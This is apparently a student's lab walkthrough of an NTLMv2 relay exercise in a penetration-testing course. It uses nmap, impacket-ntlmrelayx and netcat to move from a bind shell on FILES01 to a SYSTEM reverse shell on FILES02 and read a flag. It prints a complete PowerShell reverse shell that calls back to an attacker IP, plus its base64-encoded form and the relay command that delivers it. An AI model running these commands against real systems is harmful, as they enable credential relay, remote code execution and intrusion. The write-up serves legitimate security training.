# Walk: Password Attacks - Relaying Net-NTLMv2 - VM Group 1

## Fecha: 27/02/2025
## Host: Windows
## IP: 192.168.xxx.212
## Objetivo
Use the methods from this section to get access to VM #2 (FILES02) of VM Group 1 and obtain the flag on the _files02admin_ user's desktop. If the bind shell on VM #1 is terminated, it may take up to 1 minute until it is accessible again.
## Herramientas
1. nmap
2. nc
3. ntlmrelayx (impacket)
## Procedimiento y comandos
#### Paso 1: Enumeracion
```
nmap -sV --open 192.168.129.0/24 -oN nmap-group-result.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 12:05 -03
Nmap scan report for 192.168.129.211
Host is up (0.18s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
4444/tcp open  krb524?
5555/tcp open  freeciv?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.129.212
Host is up (0.18s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.129.254
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
53/tcp open  domain  dnsmasq 2.89

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (3 hosts up) scanned in 65.60 seconds
```
> Hosts de interes: 192.168.129.211/212
#### Paso 2: Iniciamos receptores
> _"En lugar de simplemente imprimir el hash Net-NTLMv2 utilizado en el paso de autenticación, lo **reenviaremos** a FILES02. Si files02admin es un usuario local en FILES02, la autenticación es válida y, por lo tanto, la máquina la acepta"_
1. Activamos nuestro servidor SMB con **_impacket-ntlmrelayx_**
	- Debemos primero codificar a base64 nuestro payload:
	- Payload: 
```
$client = New-Object System.Net.Sockets.TCPClient("ATTAcKER_IP",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
   - Codificacion a base64:
```
echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.200",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0

```
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.129.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```
2. Activamos el receptor nc y el bind shell nc:
- `nc -lnvp 8080`
- `nc 192.168.129.211 5555`
3. Bind shell
```
nc 192.168.129.211 5555
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
files01\files02admin
```
#### Paso 3: Generamos un reverse shell
1. Desde el bind shell:
```
C:\Windows\system32>dir \\ATTACKER_IP\test
dir \\ATTACKER_IP\test
The network name cannot be found.

C:\Windows\system32>
```
- El cliente smb de impacket generara un log:
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.129.211, attacking target smb://192.168.129.212
[*] Authenticating against smb://192.168.129.212 as FILES01/FILES02ADMIN SUCCEED
[*] All targets processed!
[*] SMBD-Thread-6 (process_request_thread): Connection from 192.168.129.211 controlled, but there are no more targets left!
[*] All targets processed!
```
- El receptor nc escuchando en el puerto 8080 genera el reverse shell:
```
nc -lnvp 8080
listening on [any] 8080 ...
connect to [192.168.45.200] from (UNKNOWN) [192.168.129.212] 54692
whoami
nt authority\system
```
#### Paso 4: Obtenemos el flag
```
PS C:\Windows\system32> cd C:\Users
PS C:\Users> dir
    Directory: C:\Users

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          3/1/2023   5:32 AM                Administrator                                                        
d-----         6/20/2022   8:24 PM                anastasia                                                            
d-----          6/9/2022  12:27 PM                files02admin                                                         
d-r---          6/1/2022   3:04 PM                Public                                                               
PS C:\Users> cd files02admin
PS C:\Users\files02admin> cd Desktop
PS C:\Users\files02admin\Desktop> dir
    Directory: C:\Users\files02admin\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         2/27/2025  12:36 PM             38 flag.txt                                                             

PS C:\Users\files02admin\Desktop> type flag.txt
OS{eb4a7**********************b3fbf}
PS C:\Users\files02admin\Desktop> 
```
